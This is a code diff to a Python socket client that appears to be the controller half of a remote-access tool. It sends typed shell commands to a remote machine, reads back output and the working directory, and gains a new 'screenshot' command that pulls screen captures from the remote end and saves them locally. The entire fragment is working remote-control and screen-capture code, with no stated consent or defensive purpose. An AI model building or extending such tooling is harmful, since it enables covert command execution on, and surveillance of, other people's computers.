@@ -1,4 +1,4 @@
-import socket
+import socket, os, time
 
 SERVER_HOST = input("Enter host: ")
 SERVER_PORT = int(input("Enter port: "))
@@ -23,7 +23,14 @@ if(s.recv(BUFFER_SIZE).decode()) == "auth":
         print(f"[+] pwd : {cwd}\n\n")
         while True:
             cmd = input(f"{cwd} $ ")
-            s.send(cmd.encode())     
+            s.send(cmd.encode())  
+            if cmd.lower() == "screenshot":
+                imgdata = s.recv(BUFFER_SIZE)
+                filename = str(f'screenshot {time.strftime("%Y-%m-%d-%H-%M-%S")}.png')
+                if not os.path.exists('screenshots'):
+                    os.makedirs('screenshots')
+                with open(f"./screenshots/{filename}", 'wb') as f:
+                    f.write(imgdata)    
             output = s.recv(BUFFER_SIZE).decode()
             cwd = output.split(SEPARATOR)[0]
             if output.split(SEPARATOR)[1] == "exiting...":
